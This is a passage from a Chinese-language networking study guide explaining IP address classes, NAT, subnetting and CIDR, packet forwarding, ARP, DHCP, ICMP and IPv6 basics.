<p>上表中，A 类地址可用的网络数为 2<sup>7</sup> - 2，减 2 的原因是：第一，网络号字段全为 <code>0</code> 的 IP 地址是保留地址，意思是 “本网络”；第二，网络号为 <code>127</code> 的 IP 地址是换回自检地址。</p>
<p><strong>IP 地址有以下重要特点：</strong></p>
<ul>
<li>
<p>每个 IP 地址都由网络号和主机号两部分组成，因此 IP 地址是一种分等级的地址结构。<strong>分等级的好处是：</strong></p>
<ul>
<li>IP 地址管理机构在分配 IP 地址时只分配网络号，而主机号则由得到该网络的单位自行分配，方便了 IP 地址的管理</li>
<li>路由器仅根据目的主机所连接的网络号来转发分组（而不考虑目标主机号），从而减小了路由表所占的存储空间</li>
</ul>
</li>
<li>
<p>IP 地址是标志一台主机（或路由器）和一条链路的接口。当一台主机同时连接到两个网络时，该主机就必须同时具有两个相应的 IP 地址，每个 IP 地址的网络号必须与所在网络的网络号相同，且这两个 IP 地址的主机号是不同的。因此 IP 网络上的一个路由器必然至少应具有两个 IP 地址（路由器每个端口必须至少分配一个 IP 地址）</p>
</li>
<li>
<p>用转发器或桥接器（网桥等）连接的若干 LAN 仍然是同一个网络（同一个广播域），因此该 LAN 中所有主机的 IP 地址的网络号必须相同，但主机号必须不同</p>
</li>
<li>
<p>在 IP 地址中，所有分配到网络号的网络（无论是 LAN 还是 WAN）都是平等的</p>
</li>
<li>
<p>在同一个局域网上的主机或路由器的 IP 地址中的网络号必须是一样的。路由器总是具有两个或两个以上的 IP 地址，路由器的每个端口都有一个不同网络号的 IP 地址</p>
</li>
</ul>
<p>近年来，由于广泛使用无分类 IP 地址进行路由选择，这种传统分类的 IP 地址已成为历史。</p>
</li>
<li>
<p><strong>网络地址转换（NAT）</strong></p>
<p>网络地址转换（NAT）是指 <strong>通过将专用网络地址（如：Intranet）转换为公用地址（如：Internet），从而对外隐藏内部管理的 IP 地址</strong>。它使得整个专用网只需要一个全球 IP 地址就可以与因特网连通，由于专用网本地 IP 地址是可重用的，所以 NAT 大大节省了 IP 地址的消耗。同时，它隐藏了内部网络结构，从而降低了内部网络受到攻击的风险。</p>
<p>此外，为了网络安全，划出了部分 IP 地址为私有 IP 地址。私有 IP 地址只用于 LAN，不用于 WAN 连接（因此私有 IP 地址不能直接用于 Internet，必须通过网关利用 NAT 把私有 IP 地址转换为 Internet 中合法的全球 IP 地址后才能用于 Internet），并且允许私有 IP 地址被 LAN 重复使用。</p>
<p>这有效地解决了 IP 地址不足的问题。<strong>私有 IP 地址网段如下：</strong></p>
<ul>
<li><strong>A 类</strong>：<code>1</code> 个 <code>A</code> 类网段，即 <code>10.0.0.0~10.255.255.255</code></li>
<li><strong>B 类</strong>：<code>16</code> 个 <code>B</code> 类网段，即 <code>172.16.0.0~172.31.255.255</code></li>
<li><strong>C 类</strong>：<code>256</code> 个 <code>C</code> 类网段，即 <code>192.168.0.0~192.168.255.255</code></li>
</ul>
<p>在因特网中的所有路由器，对目的地址是私有地址的数据报一律不进行转发。这种采用私有 IP 地址的互联网络称为专用互联网或本地互联网。私有 IP 地址也称可重用地址。</p>
<p>使用 NAT 时需要在专用网连接到因特网的路由器上安装 NAT 软件，NAT 路由器至少有一个有效的外部全球 IP 地址。使用本地地址的主机和外界通信时，NAT 路由器使用 NAT 转换表进行本地 IP 地址和全球 IP 地址的转换。NAT 转换表中存放着 {本地 IP 地址:端口} 到 {全球 IP 地址:端口} 的映射。通过这种映射方式，可让多个私有 IP 地址映射到一个全球 IP 地址。</p>
<p><strong>NAT 路由器的工作原理：</strong></p>
<ul>
<li>假设用户主机 <code>10.0.0.1</code>（随机端口 <code>3345</code>）向 Web 服务器 <code>128.119.40.186</code>（端口 <code>80</code>）发送请求</li>
<li>NAT 路由器收到 IP 分组后，为该 IP 分组生成一个新端口号 <code>5001</code>，将 IP 分组的源地址更改为 <code>138.76.29.7</code>（即 NAT 路由器的全球 IP 地址），将源端口号更改为 <code>5001</code>。NAT 路由器在 NAT 转换表中增加一个表项</li>
<li>Web 服务器并不知道刚抵达的 IP 分组已被 NAT 路由器进行了改装，更不知道用户的专用地址，它响应的 IP 分组的目的地址是 NAT 路由器的全球 IP 地址，目的端口号是 <code>5001</code></li>
<li>响应分组到达 NAT 路由器后，通过 NAT 转换表将 IP 分组的目的 IP 地址更改为 <code>10.0.0.1</code>，将目的端口号更改为 <code>3345</code></li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>普通路由器在转发 IP 数据报时，不改变其源 IP 地址和目的 IP 地址。而 NAT 路由器在转发 IP 数据报时，一定要更换其 IP 地址（转换源 IP 地址或目的 IP 地址）。普通路由器仅工作在网络层，而 NAT 路由器转发数据报时需要查看和转换传输层的端口号</p>
</div>
</li>
</ol>
<h4> 子网划分与子网掩码、CIDR</h4>
<ol>
<li>
<p><strong>子网划分</strong></p>
<p>两级 IP 地址的缺点：IP 地址空间的利用率有时很低；给每个物理网络分配一个网络号会使路由表变得太大而使网络性能变坏；两级的 IP 地址不够灵活。</p>
<p>从 1985 年起，在 IP 地址中又增加了一个 “子网号字段”，使两级 IP 地址变成了三级 IP 地址。这种做法称为 <strong>子网划分</strong>。子网划分已成为因特网的正式标准协议。</p>
<p><strong>子网划分的基本思路如下：</strong></p>
<ul>
<li>子网划分纯属一个单位内部的事情。单位对外仍然表现为没有划分子网的网络</li>
<li>从主机号借用若干比特作为子网号，当然主机号也就相应减少了相同的比特。三级 IP 地址的结构如下：<code>IP地址 = {&lt;网络号&gt;,&lt;子网号&gt;,&lt;主机号&gt;}</code></li>
<li>凡是从其他网络发送给本单位某台主机的 IP 数据报，仍然是根据 IP 数据报的目的网络号，先找到连接到本单位网络上的路由器。然后该路由器在收到 IP 数据报后，按目的网络号和子网号找到目的子网。最后把 IP 数据报接交符给目的主机</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<ul>
<li>划分子网只是把 IP 地址的主机号这部分进行再划分，而不改变 IP 地址原来的网络号。因此，从一个 IP 地址本身或 IP 数据报的首部，无法判断源主机或目的主机所连接的网络是否进行了子网划分</li>
<li>RFC950 规定，对分类的 IPv4 地址进行子网划分时，子网号不能为全 <code>1</code> 或全 <code>0</code>。但随着 CIDR 的广泛使用，现在全 <code>1</code> 和全 <code>0</code> 的子网号也可使用，但一定要谨慎使用，要弄清你的路由器所用的路由选择软件是否支持全 <code>0</code> 或全 <code>1</code> 的子网号</li>
<li>不论是分类的 IPv4 地址还是 CIDR，其子网中的主机号为全 <code>0</code> 或全 <code>1</code> 的地址都不能被指派。子网中主机号全 <code>0</code> 的地址为子网的网络号，主机号全 <code>1</code> 的地址为子网的广播地址</li>
</ul>
</div>
</li>
<li>
<p><strong>子网掩码</strong></p>
<p>为了告诉主机或路由器对一个 A 类、B 类、C 类网络进行了子网划分，使用子网掩码来表达对原网络中主机号的借位。</p>
<p>子网掩码是一个与 IP 地址相对应的、长 <code>32bit</code> 的二进制串，它由一串 <code>1</code> 和跟随的一串 <code>0</code> 组成。其中，<code>1</code> 对应于 <code>IP</code> 地址中的网络号及子网号，而 <code>0</code> 对应于主机号。计算机只需将 IP 地址和其对应的子网掩码逐位 “与”（逻辑 AND 运算），就可得出相应子网的网络地址</p>
<p>现在的因特网标准规定：所有的网络都必须使用子网掩码。如果一个网络未划分子网，那么就采用默认子网掩码。A、B、C 类地址的默认子网掩码分别为 <code>255.0.0.0、255.255.0.0、255.255.255.0</code>。例如：某主机的 IP 地址 <code>192.168.5.56</code>，子网掩码为 <code>255.255.255.0</code>，进行逐位 “与” 运算后，得出该主机所在子网的网络号为 <code>192.168.5.0</code>。</p>
<p>由于子网掩码是一个网络或一个子网的重要属性，所以路由器在相互之间交换路由信息时，必须把自己所在网络（或子网）的子网掩码告诉对方。路由表中的每个条目，除要给出目的网络地址和下一跳地址外，还要同时给出该目的网络的子网掩码。</p>
<p><strong>在使用子网掩码的情况下：</strong></p>
<ul>
<li>一台主机在设置 IP 地址信息的同时，必须设置子网掩码</li>
<li>同属于一个子网的所有主机及路由器的相应端口，必须设置相同的子网掩码</li>
<li>路由器的路由表中，所包含信息的主要内容有目的网络地址、子网掩码、下一跳地址</li>
</ul>
</li>
<li>
<p><strong>无分类编址 CIDR</strong></p>
<p>无分类域间路由选择 CIDR 是在变长子网掩码的基础上提出的一种消除传统 A、B、C 类网络划分，并且可以在软件的支持下实现超网构造的一种 IP 地址的划分方法。</p>
<p>例如：如果一个单位需要 <code>2000</code> 个地址，那么就给它分配一个 <code>2048</code> 地址的块（<code>8</code> 个连续的 <code>C</code> 类网络），而不是一个完全的 B 类地址。这样可以大幅度提高 IP 地址空间的利用率，减小路由器的路由表大小，提高路由转发能力。</p>
<p>CIDR 消除了传统 A、B、C 类地址及划分子网的概念，因而可以更有效地分配 IPv4 的地址空间。CIDR 使用 “网络前缀” 的概念代替子网络的概念，与传统分类 IP 地址最大的区别就是，网络前缀的位数不是固定的，可以任意选取。<strong>CIDR 的记法是</strong>：<code>IP::={&lt;网络前缀&gt;，&lt;主机号&gt;}</code>。</p>
<p>CIDR 还使用 “斜线记法”（或称 CIDR 记法），即 IP 地址/网络前缀所占比特数。其中，网络前缀所占比特数对应于网络号的部分，等效于子网掩码中连续 <code>1</code> 的部分。例如：对于 <code>128.14.32.5/20</code> 这个地址，它的掩码是 <code>20</code> 个连续的 <code>1</code> 和后续 <code>12</code> 个连续的 <code>0</code>，通过逐位相 “与” 的方法可以得到该地址的网络前缀（或直接截取前 <code>20</code> 位）：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>逐位与</mtext><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>I</mi><mi>P</mi><mo>=</mo><mn>10000000.00001110.00100000.00000101</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>掩码</mtext><mo>=</mo><mn>11111111.11111111.11110000.00000000</mn></mrow></mstyle></mtd></mtr></mtable></mrow><mspace linebreak="newline"></mspace><mtext>网络前缀</mtext><mo>=</mo><mn>10000000.00001110.00100000.00000000</mn><mo stretchy="false">(</mo><mn>128.14.32.0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">
\text{逐位与} \begin{cases}
  IP = 10000000.00001110.00100000.00000101 \\
  \text{掩码} = 11111111.11111111.11110000.00000000
\end{cases} \\
\text{网络前缀} = 10000000.00001110.00100000.00000000(128.14.32.0)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord text"><span class="mord cjk_fallback">逐位与</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">10000000.00001110.00100000.00000101</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">掩码</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">11111111.11111111.11110000.00000000</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord cjk_fallback">网络前缀</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">10000000.00001110.00100000.00000000</span><span class="mopen">(</span><span class="mord">128.14.32.0</span><span class="mclose">)</span></span></span></span></span></p>
<p>CIDR 虽然不使用子网，但仍然使用 “掩码” 一词。“CIDR 不使用子网” 是指 CIDR 并没有在 <code>32</code> 位地址中指明若干位作为子网字段。但分配到一个 CIDR 地址块的组织，仍可以在本组织内根据需要划分出一些子网。例如：某组织分配到地址块 <code>/20</code>，就可以再继续划分为 <code>8</code> 个子网（从主机号中借用 <code>3</code> 位来划分子网），这时每个子网的网络前缀就变成了 <code>23</code> 位。全 <code>0</code> 和全 <code>1</code> 的主机号地址一般不使用。</p>
<p>将网络前缀都相同的连续 IP 地址组成 “CIDR 地址块”。一个 CIDR 地址块可以表示很多地址，这种地址的聚合称为 <strong>路由聚合</strong>，或称构成超网。路由聚合使得路由表中的一个项目可以表示多个原来传统分类地址的路由，有利于减少路由器之间的信息的交换，从而提高网络性能。</p>
<p>CIDR 地址块中的地址数一定是 <code>2</code> 的整数次幕幂，实际可指派的地址数通常为 2<sup>N</sup> - 2，N 表示主机号的位数，主机号全 <code>0</code> 代表网络号，主机号全 <code>1</code> 为广播地址。网络前缀越短，其地址块所包含的地址数就越多。而在三级结构的 IP 地址中，划分子网使网络前缀变长。</p>
<p><strong>CIDR 的优点</strong> 在于网络前缀长度的灵活性。由于上层网络的前缀长度较短，因此相应的路由表的项目较少。而内部又可采用延长网络前缀的方法来灵活地划分子网。</p>
<p>最长前缀匹配（最佳匹配）：使用 CIDR 时，路由表中的每个项目由 “网络前缀” 和 “下一跳地址” 组成。在查找路由表时可能会得到不止一个匹配结果。此时，应当从匹配结果中选择具有最长网络前缀的路由，因为网络前缀越长，其地址块就越小，因而路由就越具体。</p>
<p>CIDR 查找路由表的方法：为了更加有效地查找最长前缀匹配，通常将无分类编址的路由表存放在一种层次式数据结构中，然后自上而下地按层次进行查找。这里最常用的数据结构就是二叉线索。</p>
</li>
<li>
<p><strong>网络层转发分组的过程</strong></p>
<p>分组转发都是基于目的主机所在网络的，这是因为互联网上的网络数远小于主机数，可以极大地压缩转发表的大小。当分组到达路由器后，路由器根据目的IP地址的网络前缀来查找转发表，确定下一跳应当到哪个路由器。因此，在转发表中，每条路由必须有下面两条信息：（目的网络，下一跳地址）</p>
<p>这样，IP 数据报最终一定可以找到目的主机所在目的网络上的路由器（可能要通过多次间接交付），当到达最后一个路由器时，才试图向目的主机进行直接交付。</p>
<p>采用 CIDR 编址时，如果一个分组在转发表中可以找到多个匹配的前缀，那么应当选择前缀最长的一个作为匹配的前缀，称为 <strong>最长前缀匹配</strong>。网络前缀越长，其地址块就越小，因而路由就越精准。为了更快地查找转发表，可以按照前缀的长短，将前缀最长的排在第 <code>1</code> 行，按前缀长度的降序排列。这样，从第 <code>1</code> 行最长的开始查找，只要检索到匹配的，就不必再继续查找。</p>
<p>此外，<strong>转发表中还可以增加两种特殊的路由：</strong></p>
<ul>
<li><strong>主机路由</strong>：对特定目的主机的 IP 地址专门指明一个路由，以方便网络管理员控制和测试网络。若特定主机的 IP 地址是 <code>a.b.c.d</code>，则转发表中对应项的目的网络是 <code>a.b.c.d/32</code>。<code>/32</code> 表示的子网掩码没有意义，但这个特殊的前缀可以用在转发表中</li>
<li><strong>默认路由</strong>：用特殊前缀 <code>0.0.0.0/0</code> 表示默认路由，全 <code>0</code> 掩码和任何目的地址进行按位与运算，结果必然为全 <code>0</code>，即必然和转发表中的 <code>0.0.0.0/0</code> 相匹配。只要目的网络是其他网络（不在转发表中），就一律选择默认路由</li>
</ul>
<p><strong>路由器执行的分组转发算法如下：</strong></p>
<ol>
<li>从收到的 IP 分组的首部提取目的主机的 IP 地址 D（即目的地址）</li>
<li>若查找到特定主机路由（目的地址为 D），就按照这条路由的下一跳转发分组；否则从转发表中的下一条（即按前缀长度的顺序）开始检查，执行步骤三</li>
<li>将这一行的子网掩码与目的地址 D 进行按位与运算。若运算结果与本行的前缀匹配，则查找结束，按照 “下一跳” 指出的进行处理（或者直接交付本网络上的目的主机，或通过指定接口发送到下一跳路由器）。否则，若转发表还有下一行，则对下一行进行检查，重新执行步骤三。否则，执行步骤四</li>
<li>若转发表中有一个默认路由，则把分组传送给默认路由；否则，报告转发分组出错</li>
</ol>
<p>值得注意的是，转发表（或路由表）并未给分组指明到某个网络的完整路径（即先经过哪个路由器，然再经过哪个路由器等）。转发表指出，到某个网络应当先到某个路由器（即下一跳路由器），在到达下一跳路由器后，再继续查找其转发表，知道下一步应当到哪个路由器。这样一步一步地查找下去，直到最后到达目的网络。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>得到下一跳路由器的 IP 地址后，并不是直接将该地址填入待发送的数据报，而是将该 IP 地址转换成 MAC 地址（通过 ARP），将此 MAC 地址放到 MAC 帧首部中，然后根据这个 MAC 地址找到下一跳路由器。在不同网络中传送时，MAC 帧中的源地址和目的地址要发生变化，但是网桥在转发帧时，不改变帧的源地址</p>
</div>
</li>
</ol>
<h4> ARP、DHCP 与 ICMP</h4>
<ol>
<li>
<p><strong>IP 地址与硬件地址</strong></p>
<p>IP 地址是网络层使用的地址，它是分层次等级的。硬件地址是数据链路层使用的地址（MAC 地址），它是平面式的。在网络层及网络层之上使用 IP 地址，IP 地址放在 IP 数据报的首部，而 MAC 地址放在 MAC 帧的首部。通过数据封装，把 IP 数据报分组封装为 MAC 帧后，数据链路层看不见数据报分组中的 IP 地址。</p>
<p>由于路由器的隔离，IP 网络中无法通过广播 MAC 地址来完成跨网络的寻址，因此在网络层只使用 IP 地址来完成寻址。寻址时，每个路由器依据其路由表（依靠路由协议生成）选择到目标网络（即主机号全为 <code>0</code> 的网络地址）需要转发到的下一跳（路由器的物理端口号或下一网络地址），而 IP 分组通过多次路由转发到达目标网络后，改为在目标 LAN 中通过数据链路层的 MAC 地址以广播方式寻址。这样可以提高路由选择的效率。</p>
<ul>
<li>在 IP 层抽象的互联网上只能看到 IP 数据报</li>
<li>虽然在 IP 数据报首部中有源 IP 地址，但路由器只根据目的 IP 地址进行转发</li>
<li>在局域网的链路层，只能看见 MAC 帧。IP 数据报被封装在 MAC 帧中，通过路由器转发 IP 分组时，IP 分组在每个网络中都被路由器解封装和重新封装，其 MAC 帧首部中的源地址和目的地址会不断改变。这也决定了无法使用 MAC 地址跨网络通信</li>
<li>尽管互连在一起的网络的硬件地址体系各不相同，但 IP 层抽象的互联网却屏蔽了下层这些复杂的细节。只要在网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机与主机或路由器之间的通信</li>
</ul>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>路由器由于互连多个网络，因此它不仅有多个 IP 地址，也有多个硬件地址</p>
</div>
</li>
<li>
<p><strong>地址解析协议（ARP）</strong></p>
<p>无论网络层使用什么协议，在实际网络的链路上传送数据帧时，最终必须使用硬件地址。所以需要一种方法来完成 IP 地址到 MAC 地址的映射，这就是地址解析协议（Address Resolution Protocol，ARP）。每台主机都设有一个 ARP 高速缓存，用来存放本局域网上各主机和路由器的 IP 地址到 MAC 地址的映射表，称 <strong>ARP 表</strong>。使用 ARP 来动态维护此 ARP 表。</p>
<p><strong>ARP 工作在网络层，其工作原理如下</strong>：主机 <code>A</code> 欲向本局域网上的某台主机 <code>B</code> 发送 IP 数据报时，先在其 ARP 高速缓存中查看有无主机 <code>B</code> 的 IP 地址。如果有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。如果没有，那么就通过使用目的 MAC 地址为 <code>FFFF-FF-FF-FF-FF</code> 的帧来封装并广播 ARP 请求分组（广播发送），使同一个局域网里的所有主机都收到此 ARP 请求。主机 <code>B</code> 收到该 ARP 请求后，向主机 <code>A</code> 发出 ARP 响应分组（单播发送），分组中包含主机 <code>B</code> 的 IP 与 MAC 地址的映射关系，主机 <code>A</code> 收到 ARP 响应分组后就将此映射写入 ARP 缓存，然后按查询到的硬件地址发送 MAC 帧。ARP 由于 “看到了” IP 地址，所以它工作在网络层，而 NAT 路由器由于 “看到了” 端口，所以它工作在传输层。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>ARP 用于解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做，尽管 ARP 请求分组是广播发送的，但 ARP 响应分组是普通的单播，即从一个源地址发送到一个目的地址</p>
</div>
<p><strong>使用 ARP 的四种典型情况：</strong></p>
<ul>
<li>发送方是主机（如：H1），要把 IP 数据报发送到本网络（网 1）上的另一台主机（如：H2）。这时 H1 在网 1 中用 ARP 找到目的主机 H2 的硬件地址</li>
<li>发送方是主机（如：H1），要把 IP 数据报发送到另一个网络上的一台主机（如：H3）。这时 H1 用 ARP 找到与网 1 连接的路由器 R1 的硬件地址，剩下的工作由 R1 来完成</li>
<li>发送方是路由器（如：R1），要把 IP 数据报转发到与 R1 连接的网络（网 2）上的一台主机（如：H3）。这时 R1 在网 2 中用 ARP 找到目的主机 H3 的硬件地址</li>
<li>发送方是路由器（如：R1），要把 IP 数据报转发到网络（如：网 3）上的一台主机（如：H4）。这时 R1 在网 2 用 ARP 找到与网 2 连接的路由器 R2 的硬件地址，剩下的工作由 R2 来完成</li>
</ul>
<p>从 IP 地址到硬件地址的解析是自动进行的，主机的用户并不知道这种地址解析过程。只要主机或路由器和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 就会自动地将这个 IP 地址解析为数据链路层所需要的硬件地址。</p>
</li>
<li>
<p><strong>动态主机配置协议（DHCP）</strong></p>
<p><strong>动态主机配置协议（Dynamic Host Configuration Protocol，DHCP）</strong> 常用于给主机动态地分配 IP 地址，它提供了即插即用的联网机制，这种机制允许一台计算机加入新的网络和获取 IP 地址而不用手工参与。DHCP 是应用层协议，它是基于 UDP 的。</p>
<p><strong>DHCP 的工作原理</strong>：使用客户/服务器模式。需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送发现报文，这时该主机就成为 DHCP 客户。本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息。若找不到，则从服务器的 IP 地址池中取一个地址分配给该计算机。DHCP 服务器的回答报文称为 <strong>提供报文。</strong></p>
<p><strong>DHCP 服务器和 DHCP 客户端的交换过程：</strong></p>
<ul>
<li>DHCP 客户机广播 “DHCP 发现” 消息，试图找到网络中的 DHCP 服务器，以便从 DHCP 服务器获得一个 IP 地址。源地址为 <code>0.0.0.0</code>，目的地址为 <code>255.255.255.255</code></li>
<li>DHCP 服务器收到 “DHCP 发现” 消息后，广播 “DHCP 提供” 消息，其中包括提供给 DHCP 客户机的 IP 地址。源地址为 DHCP 服务器地址，目的地址为 <code>255.255.255.255</code></li>
<li>DHCP 客户机收到 “DHCP 提供” 消息，如果接受该 IP 地址，那么就广播 “DHCP 请求” 消息向 DHCP 服务器请求提供 IP 地址。源地址为 <code>0.0.0.0</code>，目的地址为 <code>255.255.255.255</code></li>
<li>DHCP 服务器广播 “DHCP 确认” 消息，将 IP 地址分配给 DHCP 客户机。源地址为 DHCP 服务器地址，目的地址为 <code>255.255.255.255</code></li>
</ul>
<p>DHCP 允许网络上配置多台 DHCP 服务器，当 DHCP 客户机发出 “DHCP 发现” 消息时，有可能收到多个应答消息。这时，DHCP 客户机只会挑选其中的一个，通常挑选最先到达的。</p>
<p>DHCP 服务器分配给 DHCP 客户的 IP 地址是临时的，因此 DHCP 客户只能在一段有限的时间内使用这个分配到的 IP 地址。DHCP 称这段时间为 <strong>租用期</strong>。租用期的数值应由 DHCP 服务器自己决定，DHCP 客户也可在自己发送的报文中提出对租用期的要求。</p>
<p>DHCP 的客户端和服务器端需要通过广播方式来进行交互，原因是在 DHCP 执行初期，客户端不知道服务器端的 IP 地址，而在执行中间，客户端并未被分配 IP 地址，从而导致两者之间的通信必须采用广播的方式。采用 UDP 而不采用 TCP 的原因也很明显：TCP 需要建立连接，如果连对方的 IP 地址都不知道，那么更不可能通过双方的套接字建立连接。</p>
<p>DHCP 是应用层协议，因为它是通过客户/服务器模式工作的，DHCP 客户端向 DHCP 服务器请求服务，而其他层次的协议是没有这两种工作方式的。</p>
</li>
<li>
<p><strong>网际控制报文协议（ICMP）</strong></p>
<p>为了提高 IP 数据报交付成功的机会，在网络层使用了 <strong>网际控制报文协议（Inter met Control Message Protocol，ICMP）</strong> 来让主机或路由器报告差错和异常情况。ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。ICMP 是网络层协议。</p>
<p>ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询间报文。</p>
<p><strong>ICMP 差错报告报文</strong>：用于目标主机或到目标主机路径上的路由器向源主机报告差错和异常情况。共有以下五种常用的类型：</p>
<ul>
<li><strong>终点不可达</strong>：当路由器或主机不能交付数据报时，就向源点发送终点不可达报文</li>
<li><strong>源点抑制</strong>：当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢</li>
<li><strong>时间超过</strong>：当路由器收到生存时间（TTL）为零的数据报时，除丢弃该数据报外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文</li>
<li><strong>参数问题</strong>：当路由器或目的主机收到的数据报的首部中有的字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文</li>
<li><strong>改变路由（重定向）</strong>：路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给另外的路由器（可通过更好的路由）</li>
</ul>
<p><strong>不应发送 ICMP 差错报告报文的几种情况如下：</strong></p>
<ul>
<li>对 ICMP 差错报告报文不再发送 ICMP 差错报告报文</li>
<li>对第一个分片的数据报片的所有后续数据报片都不发送 ICMP 差错报告报文</li>
<li>对具有组播地址的数据报都不发送 ICMP 差错报告报文</li>
<li>对具有特殊地址（如：<code>127.0.0.0</code> 或 <code>0.0.0.0</code>）的数据报不发送 ICMP 差错报告报文</li>
</ul>
<p><strong>ICMP 询问报文有四种类型</strong>：回送请求和回答报文、时间戳请求和回答报文、地址掩码请求和回答报文、路由器询问和通告报文，最常用的是前两类。</p>
<p>ICMP 的两个常见应用是分组网间探测 PING（用来测试两台主机之间的连通性）和 Traceroute （UNIX 中的名字，在 Windows 中是 Tracert，可以用来跟踪分组经过的路由）。其中 PING 使用了 ICMP 回送请求和回答报文，Traceroute（Tracert）使用了 ICMP 时间超过报文。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>PING 工作在应用层，它直接使用网络层的 ICMP，而未使用传输层的 TCP 或 UDP。Traceroute/Tracert 工作在网络层</p>
</div>
</li>
</ol>
<h3> IPv6</h3>
<h4> IPv6 的主要特点</h4>
<p><strong>解决 “IP 地址耗尽” 问题的措施有以下三种：</strong></p>
<ul>
<li>采用无类别编址 CIDR，使 IP 地址的分配更加合理</li>
<li>采用网络地址转换（NAT）方法以节省全球 IP 地址</li>
<li>采用具有更大地址空间的新版本的 IPv6</li>
</ul>
<p>其中前两种方法只是延长了 IPv4 地址分配完毕的时间，只有第三种方法从根本上解决了 IP 地址的耗尽问题。</p>
<p><strong>IPv6 的主要特点如下：</strong></p>
<ul>
<li>更大的地址空间。IPv6 将地址从 IPv4 的 <code>32</code> 位增大到了 <code>128</code> 位。IPv6 的字节数（<code>16B</code>）是 IPv4 字节数（<code>4B</code>）的平方</li>
<li>扩展的地址层次结构</li>
<li>灵活的首部格式</li>
<li>改进的选项</li>
<li>允许协议继续扩充</li>
<li>支持即插即用（即自动配置）</li>
<li>支持资源的预分配</li>
<li>IPv6 只有在包的源结点才能分片，是端到端的，传输路径中的路由器不能分片，所以从一般意义上说，IPv6 不允许分片（不允许类似 IPv4 的路由分片）</li>
<li>IPv6 首部长度必须是 <code>8B</code> 的整数倍，而 IPv4 首部是 <code>4B</code> 的整数倍</li>
<li>增大了安全性。身份验证和保密功能是 IPv6 的关键特征</li>
</ul>
<p>虽然 IPv6 与 IPv4 不兼容，但总体而言它与所有其他的因特网协议兼容，包括 TCP、UDP、ICMP、IGMP、OSPF、BGP 和 DNS，只是在少数地方做了必要的修改（大部分是为了处理长的地址）。IPv6 相当好地满足了预定的目标，主要体现在：</p>
<ul>
<li>首先也是最重要的，IPv6 有比 IPv4 长得多的地址。IPv6 的地址用 <code>16</code> 个字节表示，地址空间是 IPv4 的 2<sup>128-32</sup> = 2<sup>96</sup> 倍，从长远来看，这些地址是绝对够用的</li>
<li>简化了 IP 分组头，它包含 <code>8</code> 个域（IPv4 是 <code>12</code> 个域）。这一改变使得路由器能够更快地处理分组，从而可以改善吞吐率</li>
<li>更好地支持选项。这一改变对新的分组首部很重要，因为一些从前必要的段现在变成了可选段。此外，表示选项的方式的改变还能加快分组的处理速度</li>
</ul>
<h4> IPv6 地址</h4>
<p>IPv6 数据报的目的地址可以是以下三种基本类型地址之一：</p>
<ul>
<li><strong>单播</strong>：单播就是传统的点对点通信</li>
<li><strong>多播</strong>：多播是一点对多点的通信，分组被交付到一组计算机的每台计算机</li>
<li><strong>任播</strong>：这是 IPv6 增加的一种类型。任播的目的站是一组计算机，但数据报在交付时只交付其中的一台计算机，通常是距离最近的一台计算机</li>
</ul>
